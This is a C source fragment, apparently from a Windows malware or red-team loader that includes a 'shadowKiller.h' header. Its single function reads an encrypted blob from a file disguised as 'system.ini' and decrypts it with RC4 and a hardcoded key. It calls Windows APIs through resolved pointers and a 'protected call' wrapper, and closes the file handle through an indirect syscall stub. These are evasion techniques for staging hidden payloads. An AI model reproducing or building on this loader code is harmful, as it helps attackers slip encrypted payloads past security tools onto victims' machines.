#include <Windows.h>
#include <stdio.h>
#include <stdint.h>
#include "init.h"
#include "crc32.h"
#include "rc4.h"
#include "shadowKiller.h"

BOOL GetFileLoad(uint8_t** buffer, PDWORD bufferSize)
{
	HANDLE		hFile		= NULL;
	uint32_t	dwFileSize	= 0;
	uint8_t*	pFileBuf	= NULL;
	uint32_t	dwBytesRead = 0;
	BOOL		byRet		= FALSE;
	BOOL		byRf		= FALSE;

	PROTECTED_CALL(hFile = k32Api.pCreateFileW(L"system.ini", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL));
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("- Failed to open \r\n");
		goto END;
	}
	PROTECTED_CALL(dwFileSize	= k32Api.pGetFileSize(hFile, NULL));
	pFileBuf	= calloc(dwFileSize, 1);
	dwBytesRead = 0;

	printf("+ Successfully opened \r\n");

	PROTECTED_CALL(byRf = k32Api.pReadFile(hFile, pFileBuf, dwFileSize, (PDWORD)&dwBytesRead, NULL));

	if (!byRf) {
		goto END;
	}
	
	unsigned char s[256] = { 0x29 ,0x23 ,0xBE ,0x84 ,0xE1 ,0x6C ,0xD6 ,0xAE ,0x00 };
	char key[256] = { 0x61 ,0x73 ,0x6C ,0x64 ,0x66 ,0x6A ,0x68 ,0x6E ,0x69 ,0x6F ,0x6B ,0x31 ,0x32 ,0x33 ,0x00 };
	rc4_init(s, key, (unsigned long)strlen(key));
	rc4_crypt(s, pFileBuf, dwFileSize);
	*buffer = pFileBuf;
	*bufferSize = dwFileSize;
	byRet = TRUE;
END:
	if (hFile)
	{
		PROTECTED_CALL(sysJmpNtClose(hFile));
	}
	return byRet;
}